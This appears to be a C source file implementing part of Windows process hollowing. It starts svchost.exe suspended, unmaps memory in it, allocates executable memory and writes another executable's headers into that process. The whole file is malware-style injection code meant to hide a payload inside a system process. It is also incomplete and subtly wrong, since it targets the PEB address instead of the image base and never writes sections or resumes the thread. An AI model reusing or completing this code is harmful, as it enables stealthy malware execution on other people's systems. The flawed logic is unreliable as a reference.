#include <stdio.h>
#include "helper.h"
#include <windows.h>

int main()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcess("C:\\Windows\\SysWOW64\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		printf("CreateProcess Failed (%d).\n", GetLastError());
	}


	HINSTANCE handleToRemoteNtDll = LoadLibrary("ntdll");

	FARPROC fpNtQueryInformationProcess = GetProcAddress(handleToRemoteNtDll, "NtQueryInformationProcess");
	FARPROC fpZwUnmapViewOfSection = GetProcAddress(handleToRemoteNtDll, "ZwUnmapViewOfSection");

	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
	_ZwUnmapViewOfSection ZwUnmapViewOfSection = (_ZwUnmapViewOfSection)fpZwUnmapViewOfSection;
	
	 
	PROCESS_BASIC_INFORMATION pbi;
	PULONG returnLen = NULL;

	
	NtQueryInformationProcess(
		pi.hProcess,
		ProcessBasicInformation,
		&pbi,
		sizeof(pbi),
		returnLen
	);
	
	ZwUnmapViewOfSection(pi.hProcess, pbi.PebBaseAddress);

	

	LPOFSTRUCT lpReOpenBuff;
	HANDLE hFileYo = CreateFile("C:\\Users\\pip\\Desktop\\yo.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE handleMappingYo = CreateFileMappingA(hFileYo, NULL, PAGE_READONLY, 0, 0, NULL);
	LPVOID lpBaseYo = MapViewOfFile(handleMappingYo, FILE_MAP_READ, 0, 0, 0);

	PIMAGE_DOS_HEADER dosHeaderYo = (PIMAGE_DOS_HEADER)lpBaseYo;
	PIMAGE_NT_HEADERS pNTHeaderYo = (PIMAGE_NT_HEADERS)((DWORD)dosHeaderYo + (DWORD)dosHeaderYo->e_lfanew);

	
	
	LPVOID lpVMem = VirtualAllocEx(pi.hProcess, pbi.PebBaseAddress, pNTHeaderYo->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	

	BYTE* headerBuffer = new BYTE[ pNTHeaderYo->OptionalHeader.SizeOfHeaders + 1 ];

	memcpy(headerBuffer, dosHeaderYo, pNTHeaderYo->OptionalHeader.SizeOfHeaders + 1);

	//for (int i = 0; i < 1025; i++)
	//	printf("%x ", headerBuffer[i]);

	if (!WriteProcessMemory(pi.hProcess, pbi.PebBaseAddress, headerBuffer, pNTHeaderYo->OptionalHeader.SizeOfHeaders, NULL)) 
	{
		printf("Failed: Unable to write headers");
		exit(-1);
	}
	
	printf("Created Process id: %i\n", pi.dwProcessId);
	printf("Size of Image: %u\n", pNTHeaderYo->OptionalHeader.SizeOfImage);
	printf("Created Process PebBaseAddress: 0x%x\n", pbi.PebBaseAddress);

	return 0;
}